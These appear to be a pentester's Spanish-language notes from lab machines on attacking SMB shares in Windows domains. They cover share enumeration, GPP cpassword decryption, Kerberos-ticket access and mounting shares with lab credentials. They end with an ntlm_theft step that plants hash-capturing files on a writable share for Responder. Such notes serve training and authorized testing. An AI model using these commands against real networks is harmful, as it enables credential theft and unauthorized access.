
```bash
netexec smb $IP
```

- Añadimos su dominio con la IP al `/etc/hosts` 

```bash
crackmapexec smb $IP --shares

smbmap -H 10.10.10.175
smbmap -H 10.10.10.175 -u "null"
smbmap -H 10.10.10.175 -u "null" -r Dir


smbclient -L 10.10.10.175 -N
smbclient //10.10.11.51/Users -U 'rose' --password 'KxEPkKe6R8su'
smbclient //10.10.11.152/Shares -N

prompt off
get archivo
recurse ON
mget * 
```

## Groups.xml

- Esta en {} -> Preferences -> Groups 
```bash
gpp-decrypt cpassword
```

## Kerberos

```bash
KRB5CCNAME=ryan.naylor.ccache smbclient.py -k DC.VOLEUR.HTB

USE $RECURSO

ls
```

## CLonar por CIFS

```bash
mkdir /mnt/smbmounted

mount -t cifs //10.10.10.182/Data /mnt/smbmounted -o username=r.thompson,password=rY4n5eva,domain=cascade.local,rw

umount /mnt/smbmounted
```

## WRITE

```bash
https://github.com/Greenwolf/ntlm_theft
#Pon tu IP
python ntlm_theft.py -g all -s 10.10.14.6 -f 0xdf
#Conectas donde tengas los archivos
#Responder
prompt off

mput * 
```

